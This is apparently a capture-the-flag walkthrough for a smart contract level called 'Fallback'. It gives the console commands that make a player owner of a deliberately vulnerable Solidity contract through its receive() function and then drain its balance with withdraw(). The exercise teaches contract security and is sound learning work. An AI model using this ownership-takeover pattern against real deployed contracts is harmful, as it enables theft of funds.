# 1. Fallback

Open the developer console.

___
## 1. Initial Considerations & Methodology

For this level there are potentially two ways of changing the owner of the contract (which is needed in order to drain the funds):  
1. By calling ```contribute()``` and contributing more than 1000 ETH in order to trigger:

```
if(contributions[msg.sender] > contributions[owner]) 
  owner = msg.sender;
}
```
This method seems excessive in order to drain the contract. While you would be able to recoup the deposited ETH during the contract drain, it requires you to have 1000 ETH which not many do.  
**This method can therefore be discounted.**

2. By triggering the ```receive()``` function. This method has two conditions that must be met.The first requires you to have contributed more than 0 ETH into the contract. The second requires that the value passed into ```receive()``` is greater than 0 ETH.  
**This is the method that is easiest to complete and the one that will be used.**
___
## 2. How To Complete

The three stages to complete are:  
1. Contribute more than 0 ETH to the contract.
2. Trigger the receive function (by sending more than 0 ETH to the contract) to become the contract owner.
3. Check you are now the contract owner.
4. Drain the funds from the contract.

___
### 1. Contribute more than 0 ETH to the contract
In the developer console type:  
```
await contract.contribute({from: player, value: toWei("0.005")});
```
This will asynchronously call the contribute function in the contract tell it who is calling it and how much you are passing into it.  
```
{from: player, value: toWei("0.005")}
```
**This satisfies stage 1.**
___
### 2. Trigger the receive function
In the developer console type:  
```
await contract.sendTransaction({from: player, value: toWei("0.005")});
```
This triggers the receive function as you are sending ETH to the contract without calling any specified function. You want to make sure the data field is also left empty.  
**This satisfies stage 2.**
___
### 3. Check you are now the contract owner
In the developer console type:  
```
player
```
This will show your address. Then type:
```
await contract.owner();
```
If the addresses in the console are the same, then **CONGRATULATIONS** you are now the owner of the contract and have nearly completed this level!
___
### 4. Drain the funds from the contract
In the developer console type:  
```
await contract.withdraw();
```
This should transfer the entire balance of the contract to the owner of the contract, which is now the player address.

**YOU CAN NOW SUBMIT THE ANSWER AND HAVE NOW COMPLETED THIS LEVEL**
